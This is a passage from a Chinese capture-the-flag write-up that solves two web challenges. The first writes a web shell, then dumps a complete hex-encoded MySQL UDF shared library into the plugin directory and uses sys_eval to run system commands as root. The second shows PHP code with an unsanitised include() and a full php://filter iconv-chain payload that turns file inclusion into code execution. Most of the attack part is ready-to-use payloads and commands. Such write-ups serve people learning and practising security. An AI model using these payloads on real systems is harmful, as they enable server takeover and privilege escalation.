src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929701948-c1262c5e-4d60-4aa5-ac27-0f1ed8f55577.png#averageHue=%23f5f5f5&clientId=u6a635397-504c-4&from=paste&height=142&id=u2a3e5f54&originHeight=178&originWidth=1904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15197&status=done&style=none&taskId=u9ecb97d2-25c7-445c-9797-d028d54f3d5&title=&width=1523.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929726374-391516ee-541a-45c2-8d82-4a4a52382311.png#averageHue=%23dfe3b9&clientId=u6a635397-504c-4&from=paste&height=754&id=uce692cc5&originHeight=942&originWidth=1908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95513&status=done&style=none&taskId=u93d00610-0913-4f45-9aa9-224fa5851cd&title=&width=1526.4" alt="image.png"><br>刷新一下，shell就写入了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929740656-6821209d-3758-4d1b-a7b6-c9a1512d6eac.png#averageHue=%23c6a26d&clientId=u6a635397-504c-4&from=paste&height=669&id=u0c3a2d3d&originHeight=836&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=150186&status=done&style=none&taskId=u1c45369e-395f-4d3a-9806-b4804b94a1e&title=&width=1530.4" alt="image.png"><br>现在我们可以蚁剑连接这个shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929783923-ea91df69-7a7e-4c25-9018-662c846243e6.png#averageHue=%23f8f8f8&clientId=u6a635397-504c-4&from=paste&height=693&id=uca7dc759&originHeight=866&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=142356&status=done&style=none&taskId=u16bad4fe-4ffc-4c1b-805c-2c00dfcab42&title=&width=1027.2" alt="image.png"><br>我们获取到了数据库的密码，第二个flag是mysql用户的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929820708-dfec392e-7161-4405-92b5-f3431b9115cd.png#averageHue=%23262322&clientId=u6a635397-504c-4&from=paste&height=454&id=u09407926&originHeight=568&originWidth=1047&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61814&status=done&style=none&taskId=u2315cb6c-c872-4af5-becc-b66e856304d&title=&width=837.6" alt="image.png"><br>这里就得mysql的udf提权了。我们只需要写一个plugin进去，但是不能直接写进去，因为plugin目录没权限写<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929859078-60a69dc9-fc79-4f93-a9d2-27e1193fd766.png#averageHue=%232a2725&clientId=u6a635397-504c-4&from=paste&height=161&id=u34c5dace&originHeight=201&originWidth=809&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23183&status=done&style=none&taskId=u4c900c9c-c6b7-4319-b763-62e19bf60e3&title=&width=647.2" alt="image.png"><br>因此我们需要用mysql的select into语句写一个恶意so进去，这里我整理好了payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p456456zxc+123666 -e &quot;SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;</span><br></pre></td></tr></table></figure>
<p>我们不能直接反弹shell终端运行，先用蚁剑生成一个sh文件，内容如上<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691929985042-5c5d6e4d-c705-4a44-a9f3-8e0e8ef30170.png#averageHue=%23f2f0f0&clientId=u6a635397-504c-4&from=paste&height=126&id=udc768d43&originHeight=158&originWidth=916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10951&status=done&style=none&taskId=ue828a5c5-1ea6-4fc5-a76e-484ac207440&title=&width=732.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930026085-b2018a08-1bd1-4389-95e0-b5a42b77ab3e.png#averageHue=%23060505&clientId=u6a635397-504c-4&from=paste&height=190&id=uf626ba7f&originHeight=237&originWidth=930&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15955&status=done&style=none&taskId=u57e47567-22be-42f8-9c45-4c7092e921f&title=&width=744" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930043191-67598d86-f61f-4168-bd60-87f64f369f01.png#averageHue=%232d2a29&clientId=u6a635397-504c-4&from=paste&height=295&id=uabee6e96&originHeight=369&originWidth=811&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26831&status=done&style=none&taskId=ue3d74ef1-c6a9-4fe5-bac2-095dadd9d76&title=&width=648.8" alt="image.png"><br>成功写入后就udf提权<br><code>mysql -uroot -p456456zxc+123666  -e &#39;create function sys_eval returns string soname &quot;udf.so&quot;;&#39;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930122576-492c05a8-148c-41e3-9e08-10e981404cca.png#averageHue=%23363534&clientId=u6a635397-504c-4&from=paste&height=126&id=uddc77e7b&originHeight=157&originWidth=1486&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22339&status=done&style=none&taskId=uf97eabb3-70c3-450f-a0fa-1f268e20b41&title=&width=1188.8" alt="image.png"><br>然后就是<br><code>mysql -uroot -p456456zxc+123666  -e &#39;select sys_eval(&quot;chmod 777 /flag&quot;);&#39;</code><br><code>mysql -uroot -p456456zxc+123666  -e &#39;select sys_eval(&quot;cat /flag&quot;);&#39;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930175351-9296d2ef-9760-4d6c-8aa7-079685ef9788.png#averageHue=%23282625&clientId=u6a635397-504c-4&from=paste&height=315&id=ub1eaa727&originHeight=394&originWidth=1448&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57952&status=done&style=none&taskId=ubb01a9e0-b86a-4a04-8479-b54ee39c084&title=&width=1158.4" alt="image.png"><br>结束下班！！！！</p>
<h2 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h2><p>这也是比较棘手的一题，因为套了很多很多狠多层。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$jump_link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;link&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$jump_link</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$jump_link</span>. <span class="string">&quot;.txt&quot;</span>); <span class="comment">// More info? See &quot;/var/www/html/hint.ini&quot; or &quot;./hint.ini&quot;</span></span><br><span class="line">    </span><br><span class="line">&#125;  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$jump_link</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">所以到底来没来? 且看 /<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)<span class="meta">?&gt;</span>?hint</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码如上，一眼就知道是filterchain。直接打。但是这里有一个很真实的问题，那就是假如文件内容是中文的话是不能成功的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930402158-262e5511-d394-438d-989a-a662765634e6.png#averageHue=%23fcfaf7&clientId=u6a635397-504c-4&from=paste&height=378&id=u12b6049c&originHeight=472&originWidth=1285&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62177&status=done&style=none&taskId=u89a16c0d-8016-43c7-9836-87897d9293c&title=&width=1028" alt="image.png"><br>这个在陆队底下原文就可以看到了。所以为了预防这个问题我们怎么办呢，我们就2次filter协议！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691930437805-11e27399-1ff7-41bf-b427-54af7d9da4ed.png#averageHue=%23313131&clientId=u6a635397-504c-4&from=paste&height=70&id=ueaa641a8&originHeight=87&originWidth=1320&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38336&status=done&style=none&taskId=u569d2d98-6500-42bb-b1f9-7d52f0ab89a&title=&width=1056" alt="image.png"><br>先filter base64编码后再filterchain攻击，最后exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://filter/convert.base64-encode/resource=/tmp/resources/2</span><br></pre></td></tr></table></figure>
